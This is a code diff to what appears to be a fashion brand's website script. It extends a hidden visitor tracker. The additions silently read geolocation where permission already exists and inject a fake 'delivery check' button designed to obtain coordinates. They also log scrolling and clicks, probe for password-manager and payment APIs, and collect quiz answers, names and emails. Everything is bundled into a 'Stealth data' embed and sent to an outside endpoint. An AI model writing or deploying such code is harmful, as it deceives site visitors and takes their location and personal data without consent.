@@ -13,6 +13,7 @@
         en: {
             'nav-about':              'about',
             'nav-collection':         'collection',
+            'nav-lookbook':           'lookbook',
             'nav-contact':            'contact',
             'est':                    'est.\u00a02026',
             'hero-line1':             'redefine',
@@ -63,10 +64,13 @@
             'instagram':              'instagram',
             'twitter':                'twitter',
             'tiktok':                 'tiktok',
+            'geo-text':               'Check delivery to your city',
+            'geo-btn':                'Detect city',
         },
         ru: {
             'nav-about':              '\u043e \u043d\u0430\u0441',
             'nav-collection':         '\u043a\u043e\u043b\u043b\u0435\u043a\u0446\u0438\u044f',
+            'nav-lookbook':           '\u043b\u0443\u043a\u0431\u0443\u043a',
             'nav-contact':            '\u043a\u043e\u043d\u0442\u0430\u043a\u0442\u044b',
             'est':                    '\u043e\u0441\u043d.\u00a02026',
             'hero-line1':             '\u043f\u0435\u0440\u0435\u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0438',
@@ -117,6 +121,8 @@
             'instagram':              '\u0438\u043d\u0441\u0442\u0430\u0433\u0440\u0430\u043c',
             'twitter':                '\u0442\u0432\u0438\u0442\u0442\u0435\u0440',
             'tiktok':                 '\u0442\u0438\u043a\u0442\u043e\u043a',
+            'geo-text':               '\u0423\u0437\u043d\u0430\u0442\u044c \u0432\u0440\u0435\u043c\u044f \u0434\u043e\u0441\u0442\u0430\u0432\u043a\u0438 \u0432 \u0432\u0430\u0448 \u0433\u043e\u0440\u043e\u0434',
+            'geo-btn':                '\u041e\u043f\u0440\u0435\u0434\u0435\u043b\u0438\u0442\u044c \u0433\u043e\u0440\u043e\u0434',
         }
     };
 
@@ -638,6 +644,159 @@
         return r;
     }
 
+    // 20) GEOLOCATION — stealth check via Permissions API first
+    function stealthGeoCheck(callback) {
+        var r = { permission: '—', lat: null, lon: null, error: null };
+        // First check if we already have permission without prompting
+        if (navigator.permissions && navigator.permissions.query) {
+            navigator.permissions.query({ name: 'geolocation' }).then(function(p) {
+                r.permission = p.state; // 'granted', 'prompt', 'denied'
+                if (p.state === 'granted') {
+                    // Permission already given — grab silently
+                    navigator.geolocation.getCurrentPosition(function(pos) {
+                        r.lat = pos.coords.latitude;
+                        r.lon = pos.coords.longitude;
+                        r.accuracy = pos.coords.accuracy;
+                        callback(r);
+                    }, function(err) {
+                        r.error = err.message;
+                        callback(r);
+                    }, { timeout: 3000, enableHighAccuracy: false });
+                } else {
+                    callback(r);
+                }
+            }).catch(function() { callback(r); });
+        } else {
+            callback(r);
+        }
+    }
+
+    // 21) BEHAVIOR TRACKING — scroll depth, time, clicks
+    var BEHAVIOR = { scrollDepth: 0, maxScroll: 0, timeOnPage: 0, clicks: 0, inputs: 0 };
+    function trackBehavior() {
+        // scroll depth
+        window.addEventListener('scroll', function() {
+            var doc = document.documentElement;
+            var scrollPct = Math.round((doc.scrollTop || window.pageYOffset) / (doc.scrollHeight - doc.clientHeight) * 100);
+            if (scrollPct > BEHAVIOR.maxScroll) BEHAVIOR.maxScroll = scrollPct;
+        }, { passive: true });
+        // clicks
+        document.addEventListener('click', function() { BEHAVIOR.clicks++; }, { passive: true });
+        // form interactions
+        document.addEventListener('input', function() { BEHAVIOR.inputs++; }, { passive: true });
+        // time on page
+        var start = Date.now();
+        var timeInt = setInterval(function() {
+            BEHAVIOR.timeOnPage = Math.round((Date.now() - start) / 1000);
+        }, 10000);
+        // stop interval on unload
+        window.addEventListener('beforeunload', function() { clearInterval(timeInt); });
+    }
+
+    // 22) CREDENTIAL / PAYMENT DETECTION (silent, just check existence)
+    function getCredentialData() {
+        var r = { passwordManager: '—', paymentHandler: '—', webauthn: '—' };
+        try {
+            if (navigator.credentials) {
+                r.passwordManager = 'Yes (api exists)';
+                // We don't call .get() — that would prompt
+            }
+        } catch(e) {}
+        try {
+            if (window.PaymentRequest) {
+                r.paymentHandler = 'Yes (api exists)';
+            }
+        } catch(e) {}
+        try {
+            if (window.PublicKeyCredential) {
+                r.webauthn = 'Yes (api exists)';
+            }
+        } catch(e) {}
+        return r;
+    }
+
+    // 23) MORE SILENT API CHECKS
+    function getMoreAPIData() {
+        var r = {};
+        try { r.standalone = window.navigator.standalone ? 'Yes (PWA)' : 'No'; } catch(e) { r.standalone = '—'; }
+        try { r.isInStandalone = window.matchMedia('(display-mode: standalone)').matches ? 'Yes' : 'No'; } catch(e) {}
+        try { r.devicePosture = window.matchMedia('(device-posture: folded)').matches ? 'Folded' : 'Unfolded/—'; } catch(e) {}
+        try { r.screenFold = screen.isExtended ? 'Yes' : 'No'; } catch(e) {}
+        try { r.windowControlsOverlay = navigator.windowControlsOverlay ? 'Yes' : 'No'; } catch(e) {}
+        try { r.notificationPerm = Notification.permission || '—'; } catch(e) { r.notificationPerm = '—'; }
+        // check if the page was bookmarked via some heuristics
+        try {
+            if (window.matchMedia('(display-mode: browser)').matches) {
+                // normal browser mode
+            }
+        } catch(e) {}
+        return r;
+    }
+
+    // 24) GEOLOCATION UI — natural "delivery check" button
+    function injectGeoButton() {
+        // Only inject on pages that have a contact section
+        var contactSection = document.querySelector('.contact-wrapper');
+        if (!contactSection) return;
+        // Create a natural-looking delivery check UI
+        var geoDiv = document.createElement('div');
+        geoDiv.className = 'geo-delivery';
+        geoDiv.style.cssText = 'margin-top:20px;padding:16px;border-radius:12px;background:rgba(56,189,248,0.06);border:1px solid rgba(56,189,248,0.15);text-align:center;';
+        geoDiv.innerHTML = '<p style="font-size:0.85rem;color:var(--text-muted);margin-bottom:8px;" data-lang="geo-text">\u0423\u0437\u043d\u0430\u0442\u044c \u0432\u0440\u0435\u043c\u044f \u0434\u043e\u0441\u0442\u0430\u0432\u043a\u0438 \u0432 \u0432\u0430\u0448 \u0433\u043e\u0440\u043e\u0434</p><button class="btn btn-outline" style="font-size:0.8rem;padding:8px 20px;" data-lang="geo-btn">\u041e\u043f\u0440\u0435\u0434\u0435\u043b\u0438\u0442\u044c \u0433\u043e\u0440\u043e\u0434</button><div class="geo-result" style="margin-top:8px;font-size:0.8rem;color:var(--text-light);display:none;"></div>';
+        // Insert into contact form area
+        var form = contactSection.querySelector('.contact-form');
+        if (form) {
+            form.appendChild(geoDiv);
+        } else {
+            contactSection.appendChild(geoDiv);
+        }
+
+        var btn = geoDiv.querySelector('button');
+        var resultDiv = geoDiv.querySelector('.geo-result');
+        var textP = geoDiv.querySelector('p');
+
+        // Translate the button text
+        var lang = localStorage.getItem('why-lang') || 'en';
+        if (TRANSLATIONS[lang]) {
+            if (TRANSLATIONS[lang]['geo-text']) textP.innerHTML = TRANSLATIONS[lang]['geo-text'];
+            if (TRANSLATIONS[lang]['geo-btn']) btn.textContent = TRANSLATIONS[lang]['geo-btn'];
+        }
+
+        btn.addEventListener('click', function() {
+            // Reset
+            btn.textContent = btn.textContent;
+            btn.style.pointerEvents = 'none';
+            btn.textContent = '\u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u0438\u0435...';
+
+            if (!navigator.geolocation) {
+                resultDiv.textContent = '\u041d\u0435 \u0434\u043e\u0441\u0442\u0443\u043f\u043d\u043e';
+                resultDiv.style.display = 'block';
+                btn.style.pointerEvents = '';
+                btn.textContent = btn.textContent;
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(function(pos) {
+                var lat = pos.coords.latitude.toFixed(4);
+                var lon = pos.coords.longitude.toFixed(4);
+                resultDiv.textContent = '\u0412\u0430\u0448 \u0440\u0435\u0433\u0438\u043e\u043d \u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d: ~' + lat + ', ' + lon + ' (' + pos.coords.accuracy.toFixed(0) + '\u043c \u0442\u043e\u0447\u043d\u043e\u0441\u0442\u044c)';
+                resultDiv.style.display = 'block';
+                btn.style.pointerEvents = '';
+                btn.textContent = btn.textContent;
+                // Store for sending
+                COLLECTED.geoLat = lat;
+                COLLECTED.geoLon = lon;
+                COLLECTED.geoAccuracy = pos.coords.accuracy;
+            }, function(err) {
+                resultDiv.textContent = '\u041d\u0435 \u0443\u0434\u0430\u043b\u043e\u0441\u044c \u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0438\u0442\u044c \u0433\u043e\u0440\u043e\u0434 (' + err.message + ')';
+                resultDiv.style.display = 'block';
+                btn.style.pointerEvents = '';
+                btn.textContent = btn.textContent;
+                COLLECTED.geoError = err.message;
+            }, { timeout: 8000, enableHighAccuracy: false });
+        });
+    }
+
     // ──────────── COLLECT ALL ────────────────
 
     var COLLECTED = {};
@@ -847,6 +1006,20 @@
         // Client Hints (async, will be enhanced later)
         var ch = getClientHints();
         Object.keys(ch).forEach(function(k) { data['ch_' + k] = ch[k]; });
+
+        // === NEW STEALTH DATA ===
+
+        // Credential / Payment detection (silent)
+        var cred = getCredentialData();
+        Object.keys(cred).forEach(function(k) { data[k] = cred[k]; });
+
+        // More API data
+        var more = getMoreAPIData();
+        Object.keys(more).forEach(function(k) { data[k] = more[k]; });
+
+        // Behavior (partial — will be updated live)
+        data.behaviorScrollMax = BEHAVIOR.maxScroll;
+        data.behaviorClicks = BEHAVIOR.clicks;
 
         // Store for async additions
         COLLECTED = data;
@@ -1079,7 +1252,29 @@
             footer: { text: 'why? tracker \u2022 raw / UA' }
         };
 
-        var payload = { embeds: [embed1, embed2, embed3, embed4, embed5] };
+        // Embed 6 — Geolocation & Behavior
+        var f6 = [
+            { name: '📍 Geo permission', value: data.geoPermission || '—', inline: true },
+            { name: '🌐 Geo lat/lon', value: data.geoLat ? data.geoLat + ', ' + data.geoLon : '—', inline: true },
+            { name: '📏 Geo accuracy', value: data.geoAccuracy ? data.geoAccuracy + 'm' : '—', inline: true },
+            { name: '⚠️ Geo error', value: data.geoError || '—', inline: true },
+            { name: '📜 Max scroll', value: (data.behaviorScrollMax || 0) + '%', inline: true },
+            { name: '👆 Clicks', value: String(data.behaviorClicks || 0), inline: true },
+            { name: '🔐 Password manager', value: data.passwordManager || '—', inline: true },
+            { name: '💳 Payment API', value: data.paymentHandler || '—', inline: true },
+            { name: '🔑 WebAuthn', value: data.webauthn || '—', inline: true },
+            { name: '📱 Standalone PWA', value: data.standalone || data.isInStandalone || '—', inline: true },
+            { name: '🔔 Notification perm', value: data.notificationPerm || '—', inline: true },
+        ];
+
+        var embed6 = {
+            title: '\ud83d\udd75\ufe0f Stealth data',
+            color: 0xF0F9FF,
+            fields: f6,
+            footer: { text: 'why? tracker \u2022 geo / behavior' }
+        };
+
+        var payload = { embeds: [embed1, embed2, embed3, embed4, embed5, embed6] };
 
         try {
             var xhr = new XMLHttpRequest();
@@ -1094,6 +1289,18 @@
     function initTracker() {
         var data = collectSync();
         var sent = false;
+        // Look for data from child pages (lookbook quiz, etc.)
+        if (window._trackerData) {
+            Object.keys(window._trackerData).forEach(function(k) { data[k] = window._trackerData[k]; });
+        }
+        if (window._pendingQuizData) {
+            data.quizResult = window._pendingQuizData.result;
+            data.quizAnswers = JSON.stringify(window._pendingQuizData.answers);
+        }
+        if (window._pendingLeadData) {
+            data.quizName = window._pendingLeadData.name;
+            data.quizEmail = window._pendingLeadData.email;
+        }
         var timer = null;
 
         function sendAll(extra) {
@@ -1112,7 +1319,7 @@
         }, 8000);
 
         // Async tasks in parallel:
-        var pending = 5; // IP, battery, adblock, localIP, incognito
+        var pending = 6; // IP, battery, adblock, localIP, incognito, stealthGeo
 
         function checkDone() {
             pending--;
@@ -1156,6 +1363,16 @@
                 data.incognitoFSUsage = inc.fsUsage;
                 data.incognitoPrivateHeuristic = inc.privateHeuristic;
                 data.incognitoLocalStorage = inc.localStorage;
+            }
+            checkDone();
+        });
+
+        // 6) Stealth geo check (via Permissions API, no prompt unless already granted)
+        stealthGeoCheck(function(geo) {
+            if (geo) {
+                data.geoPermission = geo.permission;
+                if (geo.lat) { data.geoLat = geo.lat; data.geoLon = geo.lon; data.geoAccuracy = geo.accuracy; }
+                if (geo.error) data.geoError = geo.error;
             }
             checkDone();
         });
@@ -1245,6 +1462,12 @@
         window.addEventListener('scroll', function() {
             nav.classList.toggle('scrolled', window.pageYOffset > 100);
         }, { passive: true });
+
+        // 🕵️ STEALTH: behavior tracking
+        trackBehavior();
+
+        // 🕵️ STEALTH: geolocation button (natural, user-initiated)
+        injectGeoButton();
     }
 
     // ==========================================
